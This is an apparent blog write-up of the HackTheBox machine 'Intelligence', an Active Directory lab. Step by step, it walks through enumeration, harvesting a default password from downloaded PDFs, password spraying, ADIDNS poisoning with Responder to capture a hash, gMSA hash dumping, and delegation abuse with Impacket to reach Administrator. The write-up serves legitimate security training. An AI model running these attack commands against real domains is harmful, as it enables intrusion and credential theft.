---
title: 'HTB Intelligence - Medium'
date: 2024-05-08 00:00:00 +0000
categories: [HTB Machines]
tags: [Medium, Windows, HTB]
---

**Intelligence** is a medium HTB machine that begins with a crucial enumeration phase to discover **critical files that are exposed** in the web server. Next, you will need perform a **DNS poisoning attack** to move laterally. Privilege escalation to Domain Admins is possible because of **high AD privileges and weak passwords**.

<img src="/assets/img/intelligence/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.95.154

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.95.154 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 49667, 49691, 49692, 49710, 49714

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.95.154 -sVC -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49710,49714

[+] NSE Scan results: 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-08 02:34 WEST
Nmap scan report for 10.129.95.154
Host is up (0.064s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-08 08:35:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-05-08T08:36:54+00:00; +7h00m11s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-05-08T08:36:55+00:00; +7h00m11s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2024-05-08T08:36:54+00:00; +7h00m11s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-05-08T08:36:55+00:00; +7h00m11s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m10s, deviation: 0s, median: 7h00m10s
| smb2-time: 
|   date: 2024-05-08T08:36:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.35 seconds

[+] Script finished successfully
```

Appended the newly discovered hostname and domain to /etc/hosts.

```bash
echo -e "10.129.95.154\tintelligence.htb dc.intelligence.htb" | sudo tee -a /etc/hosts
10.129.95.154   intelligence.htb dc.intelligence.htb
```

This web page receives us on port TCP/80.

<img src="/assets/img/intelligence/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

Scrolling down just a bit shows two downloadable files.

<img src="/assets/img/intelligence/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

Those files don’t contain any relevant information. However, we notice that both of them are under the /documents directory and have the same name structure (aaaa-mm-dd-upload.pdf).

<img src="/assets/img/intelligence/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

Created a simple Python script that downloads all files with that name rule.

```python
import argparse
import os
import shlex
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor

def show_cursor():
    command = '/usr/bin/tput cnorm'
    subprocess.run(shlex.split(command))

def hide_cursor():
    command = '/usr/bin/tput civis'
    subprocess.run(shlex.split(command))

def set_dest_directory():
    dest_file = 'intelligence_downloads'
    if not os.path.exists(dest_file):
        os.mkdir(dest_file)
    os.chdir(dest_file)

def download(target, file):
    url = f'http://{target}/documents/{file}'
    command = f'/usr/bin/wget {url}'
    subprocess.run(shlex.split(command), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB Intelligence script"
    )
    parser.add_argument('-t', '--target', dest='target', required=True)
    return parser.parse_args()

def bye():
    print(f"\n[+] Downloaded {len(os.listdir())} files into 'intelligence_downloads'")

def main():
    try:
        hide_cursor()
        args = set_arguments()
        filenames = [f'2020-{month:02d}-{day:02d}-upload.pdf' for month in range(1,13) for day in range(1,32)]

        print("\n[+] Downloading PDF files...")
        set_dest_directory()
        with ThreadPoolExecutor(max_workers=50) as executor:
            for file in filenames:
                executor.submit(download, args.target, file)
        bye()

    except KeyboardInterrupt:
        print("\n[!] Keyboard interrumpt detected. Quitting!")
        sys.exit(1)

    except Exception as e:
        print(f"\n{e}")

    finally:
        show_cursor()

main()
```

Executed it and downloaded a total of 84 files. Our guesses were right.

```bash
python3 [intelligence.py](http://intelligence.py/) -t 10.129.95.154

[+] Downloading PDF files...

[+] Downloaded 84 files into 'intelligence_downloads'
```

Used pdftotext to transform all PDF files into txt readable files.

```bash
cd intelligence_downloads
for file in $(ls); do pdftotext $file $file.txt; done
```

Filtering for credentials shows a clear-text password. Noice!

```bash
cat *.txt | grep -i pass -A 2 -B 2
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
<REDACTED>
After logging in please change your password as soon as possible.
```

However, we don’t have any users. We could enumerate them via Kerberos but inspecting the metadata tags were an easier path in this box.

```bash
exiftool *.pdf | grep -i creator | awk '{print $3}' | sort -u > users.list
```

# Exploitation

Now that we have a wordlist of potential usernames and a password, let’s spread it.

```bash
netexec smb 10.129.95.154 -u users.list -p <REDACTED> --continue-on-success | grep -v '[-]'
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:<REDACTED>
```

Yes sir! We are authenticated in the Domain Controller. There are non-default SMB shares and we have read permissions to them.

```bash
netexec smb 10.129.95.154 -u Tiffany.Molina -p <REDACTED> --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:<REDACTED>
SMB         10.129.95.154   445    DC               [*] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ            
```

# Lateral Movement

The IT share has a PowerShell script.

```bash
smbclient -U "intelligence.htb\\Tiffany.Molina%<REDACTED>" //10.129.95.154/IT -c ls
  .                                   D        0  Mon Apr 19 01:50:55 2021
  ..                                  D        0  Mon Apr 19 01:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 01:50:55 2021
  
 smbclient -U "intelligence.htb\\Tiffany.Molina%<REDACTED>" //10.129.95.154/IT -c "get downdetector.ps1"
 getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
```

Inspecting the script reveals that it queries a DNS request to a record that starts with the string ‘web’. We could try to poison it by redirecting an arbitrary subdomain to us.

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

I will be using [krbrelayx](https://github.com/dirkjanm/krbrelayx). This tool is fabulous to exploit unconstrained delegation and more.

```bash
python3 ~/Desktop/tools/krbrelayx/dnstool.py -a add -d 10.10.14.112 -u intelligence.htb\\Tiffany.Molina -p <REDACTED> 10.129.95.154 -r webdusk.intelligence.htb
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

It took a 10 minutes break and there it was, a connection from Ted.Graves user.

```bash
sudo responder -I tun0 -v
```

<img src="/assets/img/intelligence/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

It was a **weak password** so we could crack it.

```bash
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
TED.GRAVES::intelligence:9305594e494c375e:704...:<REDACTED>
```

NetExec confirms that the credentials are valid.

```bash
netexec smb 10.129.95.154 -u Ted.Graves -p <REDACTED> --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Ted.Graves:<REDACTED> 
SMB         10.129.95.154   445    DC               [*] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ            
```

Running [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) and inspecting the results shows a clear and easy path to Domain Admins.

```bash
bloodhound-python -u Ted.Graves -p <REDACTED> -c all -ns 10.129.95.154 -d intelligence.htb
```

<img src="/assets/img/intelligence/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">

To read the Group Managed Service Account password, BH suggests using [gMSADumper](https://github.com/micahvandeusen/gMSADumper). We successfully read the SVC_INT$ machine account hash with the following command.

```
python3 ~/Desktop/tools/gMSADumper/gMSADumper.py -u Ted.Graves -p <REDACTED> -d intelligence.htb -l 10.129.95.154
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::<REDACTED>
svc_int$:aes256-cts-hmac-sha1-96:d514b740f01...
svc_int$:aes128-cts-hmac-sha1-96:12c88420d80...
```

SVC_INT$ is **allowed to delegate** in the Domain Controller. What this means is that we can impersonate any user in the DC, including the administrator account.

<img src="/assets/img/intelligence/Untitled 7.png" alt="Untitled 7.png" style="width:800px;">

That is exactly what we would do by requesting a **silver ticket** with Impacket.

I recently discovered that my VM is broken when it comes to Kerberos authentication. I will eventually have to fix it, but for now running the next command in the PwnBox worked just fine. 

```
echo -e "10.129.95.154\tdc.intelligence.htb intelligence.htb" | sudo tee -a /etc/hosts; sudo apt install rdate; sudo rdate -n 10.129.95.154; impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator -hashes :<REDACTED> -dc-ip 10.129.95.154 intelligence.htb/svc_int; KRB5CCNAME=Administrator.ccache impacket-wmiexec dc.intelligence.htb -k -no-pass

C:\>whoami
intelligence\administrator
```

All left is to read the root flag. GGs!

```
C:\>type c:\users\administrator\desktop\root.txt
ce33da8c57eb51fa****************
```